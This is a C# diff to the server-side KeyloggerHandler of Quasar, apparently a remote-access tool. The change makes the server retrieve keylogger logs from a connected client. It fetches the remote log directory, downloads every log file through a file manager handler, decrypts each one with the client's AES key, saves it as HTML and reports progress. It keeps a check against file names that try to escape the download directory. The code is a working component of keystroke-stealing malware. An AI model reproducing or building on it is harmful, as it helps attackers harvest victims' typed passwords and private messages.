@@ -1,7 +1,8 @@
 ﻿using Quasar.Common.Helpers;
-using Quasar.Common.IO;
 using Quasar.Common.Messages;
+using Quasar.Common.Models;
 using Quasar.Common.Networking;
+using Quasar.Server.Models;
 using Quasar.Server.Networking;
 using System;
 using System.IO;
@@ -16,9 +17,24 @@ namespace Quasar.Server.Messages
         private readonly Client _client;
 
         /// <summary>
-        /// Path to the base download directory of the client.
+        /// The file manager handler used to retrieve keylogger logs from the client.
         /// </summary>
-        private readonly string _baseDownloadPath;
+        private readonly FileManagerHandler _fileManagerHandler;
+
+        /// <summary>
+        /// The remote path of the keylogger logs directory.
+        /// </summary>
+        private string _remoteKeyloggerDirectory;
+
+        /// <summary>
+        /// The amount of all running log transfers.
+        /// </summary>
+        private int _allTransfers;
+
+        /// <summary>
+        /// The amount of all completed log transfers.
+        /// </summary>
+        private int _completedTransfers;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
@@ -27,11 +43,14 @@ namespace Quasar.Server.Messages
         public KeyloggerHandler(Client client) : base(true)
         {
             _client = client;
-            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");
+            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
+            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
+            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
+            MessageHandler.Register(_fileManagerHandler);
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsResponse;
+        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -41,8 +60,8 @@ namespace Quasar.Server.Messages
         {
             switch (message)
             {
-                case GetKeyloggerLogsResponse logs:
-                    Execute(sender, logs);
+                case GetKeyloggerLogsDirectoryResponse logsDirectory:
+                    Execute(sender, logsDirectory);
                     break;
             }
         }
@@ -52,57 +71,75 @@ namespace Quasar.Server.Messages
         /// </summary>
         public void RetrieveLogs()
         {
-            _client.Send(new GetKeyloggerLogs());
+            _client.Send(new GetKeyloggerLogsDirectory());
         }
 
-        private void Execute(ISender client, GetKeyloggerLogsResponse message)
+        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
-            // 1. retrieve directory content
-            // 2. download each file
+            _remoteKeyloggerDirectory = message.LogsDirectory;
+            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
+        }
 
-            /*if (message.FileCount == 0)
+        private string GetDownloadProgress(int allTransfers, int completedTransfers)
+        {
+            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
+            return $"Downloading...({progress}%)";
+        }
+
+        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
+        {
+            if (items.Length == 0)
             {
                 OnReport("Ready");
                 return;
             }
 
-            // don't escape from download directory
-            if (FileHelper.HasIllegalCharacters(message.Filename))
+            _allTransfers = items.Length;
+            _completedTransfers = 0;
+            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));
+
+            foreach (var item in items)
             {
-                // disconnect malicious client
-                client.Disconnect();
-                return;
+                // don't escape from download directory
+                if (FileHelper.HasIllegalCharacters(item.Name))
+                {
+                    // disconnect malicious client
+                    _client.Disconnect();
+                    return;
+                }
+
+                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
             }
+        }
 
-            if (!Directory.Exists(_baseDownloadPath))
-                Directory.CreateDirectory(_baseDownloadPath);
-
-            string downloadPath = Path.Combine(_baseDownloadPath, message.Filename + ".html");
-
-            var destFile = new FileSplitLegacy(downloadPath);
-
-            destFile.AppendBlock(message.Block, message.CurrentBlock);
-
-            if (message.CurrentBlock + 1 == message.MaxBlocks)
+        private void FileTransferUpdated(object sender, FileTransfer transfer)
+        {
+            if (transfer.Status == "Completed")
             {
                 try
                 {
-                    File.WriteAllText(downloadPath, FileHelper.ReadLogFile(downloadPath, _client.Value.AesInstance));
+                    _completedTransfers++;
+                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance));
+                    OnReport(_allTransfers == _completedTransfers
+                        ? "Successfully retrieved all logs"
+                        : GetDownloadProgress(_allTransfers, _completedTransfers));
                 }
                 catch (Exception)
                 {
-                    OnReport("Failed to write logs");
+                    OnReport("Failed to decrypt and write logs");
                 }
-
-                if (message.Index == message.FileCount)
-                {
-                    OnReport("Ready");
-                }
-            }*/
+            }
         }
 
         protected override void Dispose(bool disposing)
         {
+            if (disposing)
+            {
+                MessageHandler.Unregister(_fileManagerHandler);
+                _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
+                _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
+                _fileManagerHandler.Dispose();
+            }
         }
     }
 }
